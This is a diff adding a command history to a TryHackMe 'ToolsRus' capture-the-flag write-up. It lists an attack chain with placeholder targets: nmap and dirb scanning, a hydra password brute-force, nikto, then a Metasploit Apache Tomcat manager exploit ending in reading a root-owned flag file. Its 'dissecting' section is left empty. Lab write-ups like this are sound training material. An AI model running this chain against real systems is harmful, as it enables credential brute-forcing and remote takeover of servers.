@@ -518,8 +518,45 @@ ff1fc4a81affcc7688cf89ae7dc6e0e1
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20ToolsRus.png)
 
 # Command History
+1. `nmap -sC -sV -A {TARGET-IP} > {FILENAME1}.txt`
+2. `cat {FILENAME1}.txt`
+3. `dirb http://{TARGET IP} -r > {FILENAME2}.txt`
+4. `cat {FILENAME2}.txt`
+5. `firefox "http://{TARGET IP}/guidelines`
+6. `firefox "http://{TARGET IP}/protected"`
+7. `hydra -l {USER} -P {WORDLIST PATH} http-get://{ATTACK IP}/{PROTECTED DIRECTORY}`
+8. `firefox "http://{TARGET IP}/protected`
+9. `dirb http://{TARGET IP}:1234 -r > {FILENAME3}`
+10. `cat {FILENAME3}`
+11. `firefox "http://{TARGET IP}:1234/manager"`
+12. `nikto -id {USER:PASSWORD} -host http://{TARGET IP}:1234/manager/html`
+13. `msfconsole`
+14. `search Apache Tomcat`
+15. `info {EXPLOIT PATH}`
+16. `use {EXPLOIT PATH}`
+17. `show options`
+18. `set HttpPassword {USER'S PASSWORD}`
+19. `set HttpUsername {USER'S USERNAME}`
+20. `set RHOSTS {TARGET IP}`
+21. `set RPORT 1234`
+22. `set TARGETURI /manager`
+23. `show options`
+24. `exploit`
+25. `getuid`
+26. `ls /root`
+27. `cat /root/{FLAG TEXT FILE}`
 
 # Dissecting Some Commands
+`nmap -sC -sV -A {TARGET-IP} > {FILENAME1}.txt`
++
+
+
+`hydra -l {USER} -P {WORDLIST PATH} http-get://{ATTACK IP}/{PROTECTED DIRECTORY}`
++
+
+
+`nikto -id {USER:PASSWORD} -host http://{TARGET IP}:1234/manager/html`
++
 
 # Contributions
 This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)
